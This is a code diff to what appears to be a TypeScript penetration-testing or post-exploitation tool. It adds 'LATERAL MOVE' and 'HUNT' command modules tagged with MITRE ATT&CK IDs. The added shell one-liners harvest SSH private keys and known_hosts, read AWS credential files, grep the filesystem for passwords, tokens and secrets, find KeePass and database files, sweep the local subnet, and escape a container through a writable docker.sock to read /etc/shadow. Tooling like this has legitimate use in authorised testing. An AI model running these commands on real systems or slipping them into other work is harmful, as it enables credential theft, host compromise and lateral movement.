@@ -75,6 +75,30 @@ const MODULES: Category[] = [
       { icon: '🧩', label: 'Writable /etc/passwd',   cmd: 'ls -la /etc/passwd; [ -w /etc/passwd ] && echo WRITABLE_PASSWD || echo not-writable', tag: 'T1003' },
     ],
   },
+  {
+    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
+    cmds: [
+      { icon: '🔑', label: 'SSH Keys (all users)',   cmd: 'find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs ls -la 2>/dev/null; find /home /root -name "known_hosts" 2>/dev/null -exec cat {} \\;', tag: 'T1021' },
+      { icon: '📡', label: 'SSH Known Hosts',        cmd: 'cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null',              tag: 'T1021' },
+      { icon: '🌐', label: 'SSH Agent Sockets',      cmd: 'find /tmp -name "ssh-*" -type s 2>/dev/null; echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"', tag: 'T1021' },
+      { icon: '📁', label: 'NFS / SMB Mounts',       cmd: 'mount | grep -E "nfs|cifs|smb"; cat /etc/fstab | grep -E "nfs|cifs|smb"',       tag: 'T1021' },
+      { icon: '🔍', label: 'Scan Local /24',         cmd: 'ip route | grep -v default | head -1 | awk "{print $1}" | xargs -I{} sh -c "for i in $(seq 1 254); do (ping -c1 -W1 $(echo {} | cut -d/ -f1 | cut -d. -f1-3).$i 2>/dev/null | grep -q ttl && echo $(echo {} | cut -d/ -f1 | cut -d. -f1-3).$i) & done; wait"', tag: 'T1046' },
+      { icon: '🔗', label: 'Check SSH Reuse',        cmd: 'ps aux | grep ssh | grep -v grep; ls /tmp/ssh-* 2>/dev/null',                   tag: 'T1021' },
+      { icon: '🐳', label: 'Container Escape',       cmd: 'cat /proc/1/cgroup | grep docker; [ -w /var/run/docker.sock ] && docker run -v /:/mnt --rm -it alpine sh -c "cat /mnt/etc/shadow" 2>/dev/null || echo no-docker-sock', tag: 'T1611' },
+    ],
+  },
+  {
+    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
+    cmds: [
+      { icon: '🔑', label: 'Hunt SSH Private Keys',  cmd: 'find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null | grep -v proc | head -20', tag: 'T1552' },
+      { icon: '💾', label: 'Hunt DB Files',          cmd: 'find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.mdf" 2>/dev/null | grep -v "proc\\|sys\\|snap" | head -20', tag: 'T1005' },
+      { icon: '📄', label: 'Hunt Passwords in Files', cmd: 'grep -rli "password\\|passwd\\|secret\\|api_key\\|token" /home /etc /var/www /opt 2>/dev/null | head -25', tag: 'T1552' },
+      { icon: '🌐', label: 'Hunt VPN / Cloud',       cmd: 'find /home /root -name "*.ovpn" -o -name "credentials" -o -name "*.kube" 2>/dev/null | head -15; cat /home/*/.aws/credentials /root/.aws/credentials 2>/dev/null', tag: 'T1552' },
+      { icon: '🔐', label: 'Hunt KeePass Files',     cmd: 'find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null | grep -v proc | head -10', tag: 'T1552' },
+      { icon: '📧', label: 'Hunt Email / Tokens',    cmd: 'grep -r "gmail\\|smtp\\|imap\\|oauth\\|bearer" /home /opt /srv 2>/dev/null | grep -v ".git\\|Binary" | head -15', tag: 'T1552' },
+      { icon: '🐳', label: 'Hunt Docker Secrets',    cmd: 'find / -name "docker-compose*.yml" -o -name ".env" 2>/dev/null | xargs grep -l "password\\|secret\\|token" 2>/dev/null | head -10', tag: 'T1552' },
+    ],
+  },
 ]
 
 function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
